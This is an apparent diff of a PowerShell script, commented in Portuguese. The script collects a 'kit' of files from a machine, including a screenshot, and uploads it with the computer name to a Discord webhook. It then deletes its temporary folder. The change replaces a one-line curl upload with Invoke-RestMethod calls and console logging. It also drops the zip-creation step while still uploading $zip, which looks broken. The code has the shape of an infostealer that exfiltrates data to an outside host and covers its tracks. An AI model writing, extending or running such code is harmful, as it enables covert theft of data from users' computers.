@@ -67,11 +67,20 @@ $pathSS = "$kit\screenshot.jpg"
 $bmp.Save($pathSS, [System.Drawing.Imaging.ImageFormat]::Jpeg)
 $g.Dispose(); $bmp.Dispose()
 
-# 10) Compacta tudo
-$zip = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).zip"
-Compress-Archive -Path "$kit\*" -Destination $zip -Force
-
-# ---------- ENVIO DISCORD (curl simples, 1 linha) ----------
-curl.exe -F "file=@`"$zip`"" -F "content=Kit $env:COMPUTERNAME – $(Get-Date)" $hook 2>$null
+# ---------- ENVIO DISCORD c/ LOG ----------
+Write-Host "[*] Enviando pacote para Discord..." -ForegroundColor Yellow
+try {
+    $msg = "Kit $env:COMPUTERNAME – $(Get-Date)"
+    # 1) mensagem texto
+    $r1 = Invoke-RestMethod -Uri $hook -Method Post -ContentType "application/json" -Body (@{content=$msg} | ConvertTo-Json)
+    Write-Host "[+] Mensagem enviada – ID $($r1.id)" -ForegroundColor Green
+    # 2) arquivo
+    $r2 = Invoke-RestMethod -Uri $hook -Method Post -InFile $zip -ContentType "application/zip"
+    Write-Host "[+] Arquivo enviado – ID $($r2.id)" -ForegroundColor Green
+}
+catch {
+    Write-Host "[-] Erro no upload: $_" -ForegroundColor Red
+}
 # ---------- limpa ----------
 Remove-Item $kit -Recurse -Force
+Write-Host "[*] Pasta temporária removida. Fim." -ForegroundColor Cyan
